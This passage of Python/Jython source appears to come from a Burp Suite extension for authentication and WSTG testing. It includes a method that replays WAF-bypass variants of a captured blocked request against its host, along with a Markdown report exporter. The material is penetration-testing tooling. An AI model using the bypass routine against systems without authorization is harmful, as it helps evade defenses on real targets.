                self.queue_manual("WSTG-ATHZ", name, expectation)
        except Exception as e:
            JOptionPane.showMessageDialog(self.main_panel, "Error running WSTG AuthZ checks: %s" % e)

    def run_waf_variants(self, evt):
        try:
            msg = getattr(self, 'waf_capture_msg', None)
            if not msg:
                JOptionPane.showMessageDialog(self.main_panel, "Capture a blocked request first via context menu.")
                return
            info = self._helpers.analyzeRequest(msg)
            req_bytes = msg.getRequest()
            req_text = self._helpers.bytesToString(req_bytes)
            method = req_text.split(' ')[0]
            path = str(info.getUrl().getPath())
            if info.getUrl().getQuery():
                path += '?' + info.getUrl().getQuery()
            host = info.getUrl().getHost()
            port = info.getUrl().getPort() if info.getUrl().getPort() != -1 else (443 if info.getUrl().getProtocol() == 'https' else 80)
            protocol = info.getUrl().getProtocol()
            headers = {}
            for h in info.getHeaders()[1:]:
                if ':' in h:
                    k, v = h.split(':', 1)
                    headers[k.strip()] = v.strip()
            body = req_text[info.getBodyOffset():]

            out = []
            for name, m, p, h, hdrs, b in gen_waf_bypass_variants(method, path, host, headers, body):
                raw = build_raw_request(m, p, h, hdrs, b if b else None)
                status, _ = self._send(protocol, host, port, raw)
                out.append("%-28s -> HTTP %s" % (name, status))
                self.log("WAFBypass", "info", "%s -> HTTP %s" % (name, status))
            self.waf_output.setText("\n".join(out))
        except Exception as e:
            JOptionPane.showMessageDialog(self.main_panel, "Error running WAF bypass: %s" % e)

    # ---------------- Report Export ----------------

    def export_report(self, evt):
        try:
            chooser = JFileChooser()
            chooser.setSelectedFile(File("auth_sso_wstg_test_report.md"))
            rv = chooser.showSaveDialog(self.main_panel)
            if rv != JFileChooser.APPROVE_OPTION:
                return
            path = chooser.getSelectedFile().getAbsolutePath()
            with open(path, 'w') as f:
                f.write("# Auth / SSO / OAuth / SAML / WSTG Test Report\n\n")
                f.write("## Automated findings\n\n")
                f.write("| Module | Severity | Finding |\n|---|---|---|\n")
                for row in self.results_rows:
                    f.write("| %s | %s | %s |\n" % (row['module'], row['severity'], str(row['finding']).replace('|', '\\|')))
                f.write("\n## Queued for manual review\n\n")
                f.write("| Module | Item | Why it needs a human |\n|---|---|---|\n")
                for row in self.manual_rows:
                    f.write("| %s | %s | %s |\n" % (row['module'], row['item'], str(row['reason']).replace('|', '\\|').replace('\n', ' ')))
            JOptionPane.showMessageDialog(self.main_panel, "Report written to %s" % path)
        except Exception as e:
            JOptionPane.showMessageDialog(self.main_panel, "Error exporting report: %s" % e)
